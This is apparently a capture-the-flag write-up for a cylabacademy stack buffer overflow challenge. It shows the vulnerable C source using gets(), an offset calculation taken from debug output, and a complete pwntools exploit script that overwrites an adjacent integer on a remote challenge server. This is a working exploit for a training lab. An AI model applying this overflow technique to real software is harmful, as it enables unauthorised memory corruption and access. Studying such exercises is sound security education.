# Cylabacademy - Buffer Overflow Variable Overwrite (Automated Exploit & Offset Calculation Analysis)

This repository contains a fully automated exploit script and an in-depth architectural breakdown for the **Variable Overwrite** (often classified as Buffer Overflow 1) challenge from cylabacademy. This challenge demonstrates how an unsafe buffer constraint flaw can be leveraged to selectively modify adjacent stack variables in memory to bypass application control logic without destabilizing the runtime process.

---

## 1. Challenge Architecture & Source Code
The application is written in C and allocates two local variables within the stack frame of the `main()` function: a 16-byte character array buffer called `input` and a 32-bit signed integer called `num`.

The objective is to read `flag.txt` by manipulating the value of `num`.

### Source Code Setup
```c
int main(){
  FILE *fptr;
  char c;

  char input[16];
  int num = 64; // Initial state set to 64
  
  printf("Enter a string: ");
  fflush(stdout);
  gets(input); // Target Vulnerability: Boundary-blind boundary write
  printf("\n");
  
  printf("num is %d\n", num);
  fflush(stdout);
  
  if( num == 65 ){ // Target condition required to trigger flag read
    printf("You win!\n");
    // ... opens flag.txt, reads and outputs contents ...
    exit(0);
  }
  
  printf("Bye!\n");
}
```

---

## 2. Vulnerability Breakdown & Memory Mapping

### The Flaw: Insecure Buffer Boundary Allocation
The binary executes the obsolete `gets(input)` function to capture user string input. Because `gets()` continues consuming standard input stream bytes until it encounters a newline character (`\x0a`) or EOF, it performs zero boundary checking against the designated 16-byte destination boundary array. 

By oversaturating `input`, input bytes overflow sequentially out of the array's boundaries, traveling toward higher memory addresses on the stack.

### The Attack Vector: Target State Corruption
Under standard operation, `num` is hardcoded to `64`. To read the flag, the execution loop requires `num` to evaluate exactly to `65`. Since no legitimate arithmetic pathway modifies `num` within the code logic, we must leverage the boundary spill from `input` to overwrite the bytes of `num` via memory corruption.

---

## 3. Dynamic Analysis & Precise Offset Calculation

### The Alignment Obstacle
In an idealized, theoretical stack, placing `char input[16]` and `int num` next to each other would mean that writing exactly 16 bytes of padding followed immediately by our target payload would alter `num`. 

However, during initial deployment testing with a 16-byte offset, the binary output:
```text
num is 64
Bye!
```
This behavior indicates that the data failed to bridge the gap to `num`. Modern x86_64 compilers (GCC) enforce strict **Stack Realignment and Buffer Padding (Slack Space)** properties to optimize word-boundary data access cycles for the CPU. As a result, the compiler padded the local stack frame, placing `num` farther away from `input` than the bare 16 bytes declared in the source code.

### Decoding the Memory State (The Breakthrough)
To locate the exact boundaries of `num`, we shifted our automated exploitation footprint into `debug` mode and scaled the buffer padding footprint to an arbitrary size of **28 bytes**, followed by the 4-byte little-endian packing of `65`.

The remote instance processed the 28-byte chunk and returned a critical indicator:
```text
num is 1094795585
Bye!
```

By extracting the corrupted decimal state (`1094795585`) and translating it back into hexadecimal, we revealed the underlying memory corruption structure:
\[{1094795585} \rightarrow \{0x41414141}\]

In the standard ASCII text mapping table, `0x41` is the raw hex representation of the character **`A`**. This structural feedback proved that our 28-byte padding footprint completely crossed the memory alignment gap, oversaturated the target stack boundaries, and entirely filled all 4 bytes of the `num` storage block with the padding character `A`.

### Mathematical Deduction of the Injection Boundary
* The variable `int num` requires a 4-byte width allocation footprint.
* Our 28-byte payload completely flooded `num` with `0x41414141` (`AAAA`), meaning the last 4 bytes of our padding (bytes 25, 26, 27, and 28) landed directly inside the target variable space.
* To rest perfectly on the lower boundary edge of `num`, we subtract those 4 overlapping bytes from our trial padding length:
\[{28 Bytes} - \{4 Bytes} = \mathbf{24\{ Bytes}}\]

This verified that the compiler layout enforced a static structural offset of exactly **24 bytes** from the injection point to the edge of the integer storage block. 

By injecting 24 bytes of arbitrary data (`b"A" * 24`), we cleanly bridge the padding gap. The next 4 sequential bytes injected—constructed via Pwntools packing as `p32(65)` (0x41 0x00 0x00 0x00)—sit exactly within the integer boundaries. The program's validation check evaluates `num == 65` as true, releasing the execution locks on the flag container.

---

## 4. Automated Exploit Script (`exploit.py`)

This standalone script drives the complete exploitation pipeline automatically using the `pwntools` framework.

```python
#!/usr/bin/env python3
from pwn import *

# Set log level to 'debug' to display raw I/O byte flows natively
context.log_level = 'debug'


HOST = 'chatelaine.cylabacademy.net'
PORT = 32305  

def main():
    try:
        log.info(f"Connecting to remote target {HOST}:{PORT}...")
        p = remote(HOST, PORT)
        
        # 1. Synchronize pipeline against application prompt
        log.info("Waiting for the 'Enter a string: ' prompt from server...")
        p.recvuntil(b"Enter a string: ")
        
        # 2. Construct the calculated payload matrix
        # 24 bytes of padding to completely saturate the compiler slack space
        padding = b"A" * 24
        
        # Packing integer 65 into a 32-bit Little Endian raw byte block
        target_value = p32(65) 
        
        payload = padding + target_value
        
        # 3. Inject payload to precisely overwrite the stack variable
        log.info("Injecting calculated payload onto the target stack structure...")
        p.sendline(payload)
        
        # 4. Drain socket buffer to isolate flag data
        log.info("Capturing flag from target response...")
        output = p.recvall(timeout=5).decode('utf-8', errors='ignore')
        
        # Visual anchor formatting blocks for clean terminal parsing
        print("\n" + "=" * 60)
        print(f"[+] EXPLOIT SUCCESSFUL! SERVER RESPONSE:\n{output.strip()}")
        print("=" * 60 + "\n")
        
    except Exception as e:
        log.exception(f"Exploit script hit an execution error: {e}")

if __name__ == '__main__':
    main()
```

---

